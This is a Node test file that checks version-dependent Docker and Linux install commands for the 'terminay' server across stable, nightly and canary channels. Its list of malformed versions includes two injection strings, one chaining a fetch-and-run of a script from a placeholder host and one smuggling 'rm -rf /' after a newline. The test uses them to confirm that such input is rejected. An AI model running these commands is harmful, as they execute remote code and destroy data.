import assert from 'node:assert/strict';
import test from 'node:test';
import {
	serverInstallChannel,
	serverInstallCommands,
} from './serverInstallCommands.ts';

test('a stable client names the image at its own release', () => {
	const commands = serverInstallCommands({ version: '5.13.0' });
	assert.equal(commands.channel, 'stable');
	assert.equal(commands.image, 'markwylde/terminay:5.13.0');
	assert.equal(
		commands.docker.start,
		'docker run -d --name terminay -v terminay-data:/var/lib/terminay -v terminay-home:/home/terminay markwylde/terminay:5.13.0',
	);
	assert.equal(
		commands.docker.pair,
		'docker exec -it terminay terminay daemon qr-code',
	);
	assert.equal(commands.linux.start, 'sudo npx terminay daemon install');
	assert.equal(commands.linux.pair, 'sudo npx terminay daemon qr-code');
});

test('a nightly client names its nightly image and the main Linux channel', () => {
	const commands = serverInstallCommands({ version: '5.13.0-main.3312.nightly' });
	assert.equal(commands.channel, 'nightly');
	assert.equal(commands.image, 'markwylde/terminay:5.13.0-main.3312.nightly');
	assert.match(commands.docker.start, / markwylde\/terminay:5\.13\.0-main\.3312\.nightly$/u);
	assert.equal(commands.linux.start, 'sudo npx terminay daemon install main');
	assert.equal(commands.linux.pair, 'sudo npx terminay daemon qr-code');
});

test('a canary client names its canary image and the canary Linux channel', () => {
	const commands = serverInstallCommands({ version: '5.13.0-main.3320.canary' });
	assert.equal(commands.channel, 'canary');
	assert.equal(commands.image, 'markwylde/terminay:5.13.0-main.3320.canary');
	assert.match(commands.docker.start, / markwylde\/terminay:5\.13\.0-main\.3320\.canary$/u);
	assert.equal(commands.linux.start, 'sudo npx terminay daemon install canary');
	assert.equal(commands.linux.pair, 'sudo npx terminay daemon qr-code');
});

test('a development build, an absent version, and a malformed one name no tag', () => {
	for (const version of [
		'0.0.0',
		undefined,
		null,
		'',
		'v5.13.0',
		'5.13',
		// An old Beta build names no track any more.
		'5.13.0-beta.214',
		'5.13.0-beta.0',
		'5.13.0-beta',
		'5.13.0-main.0.canary',
		'5.13.0-main.12',
		'5.13.0-main.12.beta',
		'5.13.0-main.12.nightly.1',
		'5.13.0-rc.1',
		'5.13.0 && curl evil | sh',
		'5.13.0\nrm -rf /',
		'latest',
		5,
	]) {
		const commands = serverInstallCommands({ version });
		assert.equal(serverInstallChannel(version), 'unknown');
		assert.equal(commands.image, 'markwylde/terminay');
		assert.match(commands.docker.start, / markwylde\/terminay$/u);
		assert.equal(commands.linux.start, 'sudo npx terminay daemon install');
	}
	assert.equal(serverInstallCommands().image, 'markwylde/terminay');
});

test('the further options carry the same image', () => {
	const commands = serverInstallCommands({ version: '5.13.0-main.3320.canary' });
	assert.equal(
		commands.dockerPublic,
		"docker run -d --name terminay -v terminay-data:/var/lib/terminay -v terminay-home:/home/terminay -p 8443:8443 -p 51000-51015:51000-51015/udp -e TERMINAY_PUBLIC_HOST=<this machine's address> markwylde/terminay:5.13.0-main.3320.canary",
	);
	assert.equal(
		commands.dockerHostNetwork,
		'docker run -d --name terminay --network host -v terminay-data:/var/lib/terminay -v terminay-home:/home/terminay markwylde/terminay:5.13.0-main.3320.canary',
	);
});

test('every command is one line', () => {
	const commands = serverInstallCommands({ version: '5.13.0' });
	for (const command of [
		commands.docker.start,
		commands.docker.pair,
		commands.linux.start,
		commands.linux.pair,
		commands.dockerPublic,
		commands.dockerHostNetwork,
	])
		assert.doesNotMatch(command, /[\r\n]/u);
});
